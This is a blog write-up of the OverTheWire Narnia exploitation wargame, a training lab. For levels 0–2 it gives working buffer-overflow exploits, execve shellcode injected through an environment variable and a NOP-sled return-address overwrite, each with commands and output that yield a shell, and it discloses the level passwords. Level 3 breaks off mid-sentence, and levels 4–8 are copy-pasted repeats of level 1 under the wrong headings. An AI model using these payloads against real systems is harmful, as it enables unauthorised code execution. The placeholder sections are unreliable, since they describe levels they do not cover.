---
layout: post
title: Narnia
category: overthewire
---

## Description
This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it. The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky.

---

## General Information
 
SSH Information : 
```
    Host: narnia.labs.overthewire.org
    Port: 2226
```

Narnia's levels are called **narnia0, narnia1, ...etc** and the passwords are located in the `/etc/narnia_pass/narniaX` folder.

The first level can be accessed using : 
```
    Username: narnia0
    Password: narnia0
``` 

---

## Level 0
```
    SSH: narnia0@narnia.labs.overthewire.org -p 2226
    Password: narnia0
``` 

Navigating to the `/narnia/` directory allows us to see all of the information for all the levels, however we will look at level 0 first.

Simply running the `./narnia0` executable and providing an input `test` gives us the following output : 
```console
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: narniatest
buf: narniatest
val: 0x41414141
WAY OFF!!!!
```

Viewing the source code for the executable in `narnia0.c` reveals : 

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
      setreuid(geteuid(),geteuid());
      system("/bin/sh");
    }
    else {
      printf("WAY OFF!!!!\n");
      exit(1);
    }

    return 0;
}
```

This source code initializes two values, one as val and another as buffer specified to a 20 length string. This code will then, using the line `scanf("%24s", &buf)`, will move 24 characters from stdin into the buffer. The program will then check val to see if it has a value of `0xdeadbeef`.

Strange... the buffer is of length 20 characters and allowed an input of 24 characters. We can utilize this property to do a buffer overflow attack. Something that we know are that local variables are stored in logically contiguous memory. Something we can actually view using gdb. We can see the buffer that is filled with B as well as the 4 bytes following that are the value of val.

```console
(gdb) run
Starting program: /narnia/narnia0 BBBBBBBBBBBBBBBBBBBB
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: BBBBBBBBBBBBBBBBBBBB
buf: BBBBBBBBBBBBBBBBBBBB
val: 0x41414100

Breakpoint 1, 0x080485b2 in main ()
(gdb) x/16x $esp
0xffffd684:  0x080486e7   0x41414100   0x42424242  0x42424242
0xffffd694:  0x42424242   0x42424242   0x42424242  0x41414100
0xffffd6a4:  0x00000000   0x00000000   0xf7e2a286  0x00000002
0xffffd6b4:  0xffffd744   0xffffd750   0x00000000  0x00000000
(gdb)
```

and we can actually overwrite the 4 bytes of val with the bytes that do not fit into the buffer with the hex value `0xdeadbeef` in order to load into the shell as `narnia1`.

So this command uses python print and unix piping in order to create the hex value `0xdeadbeef`, written in little endian byte order and pass it to the executable.

```
$ narnia0@narnia:/narnia$ (python -c 'print "A" * 20 + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```

Getting the password `efeidiedae` allows us to move on to the next level.

<br>
<br>

## Level 1
```
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```
Viewing the source code for the executable in `narnia1.c` reveals : 

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
      printf("Give me something to execute at the env-variable EGG\n");
      exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

This source code shows that it retrieving the environment variable EGG and then executing it. There are a few different shell commands that are useful for this level. `env` will give the environment variable list, `export` with create environment variables, and `uname -a` will show system information.

`uname -a` gives us the system information that we can use. 

```
Linux narnia 4.18.12 #1 SMP Tue Oct 16 11:25:23 UTC 2018 x86_64 GNU/Linux
```

[shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-399.php) gives a compiled list of a bunch of shell code exploits we can use to gain access to shell, these shell code exploits are basically a series of hex characters pulled from compiled c code converted to assembly, which can then be put into memory at locations and run as code. These will be used multiple times in this wargame so they are important to know about. The link and pastable below gives the one I used, however there are other ways for the same system.

```console
\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80
```

Then using `export` and `env` allows us to upload the shell code and verif : 

```console
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
narnia1@narnia:/narnia$ env
[...]
EGG=j1X�̀�É�jFX̀�
      Rhn/shh//bi���̀
LANG=en_US.UTF-8
OLDPWD=/home/narnia1
[...]
```

Then running `./narnia1/` : 
```console
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

Perfect! Now we have the password for `narnia2` : `nairiepecu`

<br>
<br>

## Level 2
```
  SSH: narnia2@narnia.labs.overthewire.org -p 2226
  Password: nairiepecu
``` 

Simply running the `./narnia2` executable with an argument gives us the following output : 
```console
narnia2@narnia:/narnia$ ./narnia2 abcd
abcdnarnia2@narnia:/narnia$
```

Viewing the source code for the executable in `narnia2.c` reveals :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
      printf("Usage: %s argument\n", argv[0]);
      exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

Looks to be another buffer overflow attack, as `strcpy` does not check the size of the input before copying to the buffer. Something interesting is that we have no direct call to a shell. So we can combine our knowledge from the previous two levels and try to insert our shell code into the buffer.

So how do we actually get our shell code to run, after inserting it into the buffer? One thing that we can do is actually shown here in gdb :
```console
(gdb) run $(python -c 'print "A" * 152')
Starting program: /narnia/narnia2 $(python -c 'print "A" * 152')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Notice that? We segmentation fault at memory location `0x41414141`, and since `0x41` is ASCII for A, that means we are segmentation faulting at a memory value that we can specify through the buffer. We are achieving this by overriding the memory location that holds the return address of the main function. So we can trick the program to run our shell code by returning to the start of it.

Another issue we run into is that we need to return to precisely the beginning of the shell code in order to run it. A way to make this easier is by using `\x90` as our filler character instead of A. `\x90` is the command that represents `nop` in assembly, or no operation, so in theory, if we return to anywhere within our wall of `nop` then we can run our shell code. This is known as a nop slide, and is a relatively straightforward technique.

First is to find the location of the return address which we can do with some iteration, by starting from the end of the buffer, and slowly increasing the size of the buffer, we can find when the program segfaults at `0x44444444` :
```console
(gdb) run $(python -c 'print "A" * 132 + "DDDD"')
Starting program: /narnia/narnia2 $(python -c 'print "A" * 132 + "DDDD"')

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```

So this means that we have to fill our buffer with 132 bytes + return address. Our shell code (that we used prior) is 34 bytes long so that means we have 98 `\x90`s as filler. Finding our return address to use is also pretty straightforward.

Using gdb we can view the memory at `$esp`. First, we disassemble main, then looking at the assembly we can find where the call to strcpy is located. Putting a breakpoint after that call makes it so that we have our buffer put into memory at the location we want, choosing a memory location somewhere in the middle of where we have the A is OK, I chose `0xffffd868`, keeping in mind that we are not actually seeing buffer first, so keep adding on to the `$esp` until we see another set of `0x41414141`.

```console
(gdb) disas main
Dump of assembler code for function main:
   0x0804844b <+0>:     push   %ebp
   [...]
   0x0804847d <+50>:    push   %eax
   0x0804847e <+51>:    call   0x8048310 <strcpy@plt>
   0x08048483 <+56>:    add    $0x8,%esp
   [...]
   0x0804849c <+81>:    leave
   0x0804849d <+82>:    ret
End of assembler dump.
(gdb) break *main+56
Breakpoint 1 at 0x8048483
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /narnia/narnia2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048483 in main ()
(gdb) x/32x $esp
0xffffd5b0:   0xffffd5b8    0xffffd81e    0x41414141    0x41414141
0xffffd5c0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5d0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5e0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5f0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd600:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd610:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd620:   0x41414141    0x41414141    0x41414141    0x41414141
[...]
(gdb) x/32x $esp+600
0xffffd808:   0x00000000    0x6e2f0000    0x696e7261    0x616e2f61
0xffffd818:   0x61696e72    0x41410032    0x41414141    0x41414141
0xffffd828:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd838:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd848:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd858:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd868:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd878:   0x41414141    0x41414141    0x41414141    0x41414141
```

Our final command should look like this with our return address written in little endian (reverse byte order):
```console
narnia2@narnia:/narnia$ ./narnia2 `python -c "print '\x90'*98 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + '\x68\xd8\xff\xff'"`
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee
```

Got it! `vaequeezee` is the password for `narnia3`


<br>
<br>

## Level 3
```
    SSH: narnia3@narnia.labs.overthewire.org -p 2226
    Password: vaequeezee
``` 

Simply running the `./narnia3` executable gives us the following output : 
```console
narnia3@narnia:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
```

Viewing the source code for the executable in `narnia3.c` reveals :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
      printf("Usage: %s argument\n", argv[0]);
      exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
This code seems very exploitable through t

<br>
<br>

## Level 4
```
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

<br>
<br>

## Level 5
```
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

<br>
<br>

## Level 6
```
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

<br>
<br>

## Level 7
```
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

## Level 8
```
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```